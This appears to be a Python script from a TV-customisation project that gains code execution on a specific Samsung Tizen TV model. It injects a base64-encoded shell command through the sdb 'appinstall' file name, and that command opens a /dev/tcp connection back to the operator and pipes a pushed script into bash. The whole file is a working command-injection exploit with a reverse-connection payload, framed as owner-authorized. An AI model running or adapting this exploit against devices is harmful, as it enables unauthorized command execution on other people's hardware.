from pathlib import Path
import base64, ipaddress, json, os, socket, sys, threading, time, urllib.request, uuid

root=Path(__file__).resolve().parents[2]
state=root/'.local/native-home'
mode=sys.argv[1] if len(sys.argv)>1 else 'query'
if mode not in ('query','apply','restore','inspect','keyroute'): raise SystemExit('Unknown action')
host=os.environ.get('TIDYTIZEN_TV') or os.environ.get('CLEANFRAME_TV')
if not host: raise SystemExit('Set TIDYTIZEN_TV to the owner-authorized TV address.')
ipaddress.ip_address(host)
with urllib.request.urlopen('http://'+host+':8001/api/v2/',timeout=4) as response: info=json.load(response)
if info.get('device',{}).get('modelName')!='QN75QN800AFXZA': raise SystemExit('Model guard failed; nothing staged.')

aero_source=os.environ.get('AEROTIZEN_SOURCE')
if not aero_source: raise SystemExit('Set AEROTIZEN_SOURCE to the local AeroTizen src directory.')
aero=Path(aero_source).expanduser()
if not aero.exists(): raise SystemExit('AeroTizen transport is missing.')
sys.path.insert(0,str(aero))
from aerotizen.sdb import Sdb

remote_dir='/home/owner/share/tmp/sdk_tools'
with Sdb(host,timeout=18) as sdb:
 for suffix in ('dll','runtimeconfig.json','deps.json'):
  source=state/'out'/('CleanFrameHomeControl.'+suffix)
  sdb.push(source.read_bytes(),remote_dir+'/'+source.name)
 if mode in ('apply','restore'):
  sdb.push((state/'original.json').read_bytes(),remote_dir+'/CleanFrameHomeOriginal.json')
 token=uuid.uuid4().hex[:12]
 remote=remote_dir+'/cfhi-'+token+'.sh'
 sdb.push((root/'scripts/native-home'/(mode+'.sh')).read_bytes(),remote)

with socket.socket(socket.AF_INET,socket.SOCK_DGRAM) as route:
 route.connect((host,9)); local=route.getsockname()[0]

token=uuid.uuid4().hex[:12]
with socket.socket() as listener:
 listener.bind((local,0)); listener.listen(1); listener.settimeout(25); port=listener.getsockname()[1]
 command='exec 3<>/dev/tcp/'+local+'/'+str(port)+';cat '+remote+'|bash >&3 2>&3;exec 3>&-'
 script='/bin/mkdir /tmp/s-'+token+' 2>/dev/null&&{ '+command+';}'
 encoded=base64.b64encode(script.encode()).decode()
 argument='0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}'+encoded+'|base64${IFS}-d|bash`.tpk'
 if len(argument.encode())>400: raise SystemExit('Command exceeds reviewed transport length; not executed.')
 result={}
 def invoke():
  try:
   with Sdb(host,timeout=30) as sdb: result['transport']=sdb.shell(argument)
  except Exception as error: result['error']=repr(error)
 thread=threading.Thread(target=invoke,daemon=True); thread.start()
 connection,peer=listener.accept()
 if peer[0]!=host: raise RuntimeError('Unexpected callback peer; no data accepted.')
 chunks=[]
 with connection:
  connection.settimeout(10)
  while True:
   try: chunk=connection.recv(65536)
   except socket.timeout: break
   if not chunk: break
   chunks.append(chunk)
   if sum(map(len,chunks))>100000: raise RuntimeError('Unexpectedly large diagnostic output.')
 thread.join(10)

output=b''.join(chunks).decode(errors='replace')
state.mkdir(parents=True,exist_ok=True)
(state/(mode+'-output.txt')).write_text(output)
(state/(mode+'-transport.json')).write_text(json.dumps({'result':result,'remote_probe':remote,'time':time.time()},indent=2))
if 'CLEANFRAME_HOME_INSPECT_BEGIN' not in output or 'CLEANFRAME_HOME_INSPECT_END' not in output:
 raise RuntimeError('Probe incomplete; device state was not accepted.\n'+output[-2000:])
if mode=='query':
 lines=[line[len('CLEANFRAME_HOME_JSON='):] for line in output.splitlines() if line.startswith('CLEANFRAME_HOME_JSON=')]
 if len(lines)!=1: raise RuntimeError('Query did not return exactly one state snapshot.')
 snapshot=json.loads(lines[0])
 if snapshot.get('Uid')!=901 or snapshot.get('BootSupported')!=1: raise RuntimeError('Launcher failed SDK-user or boot eligibility guard.')
 original=state/'original.json'
 if not original.exists(): original.write_text(json.dumps(snapshot,indent=2)+'\n')
print(output,end='')
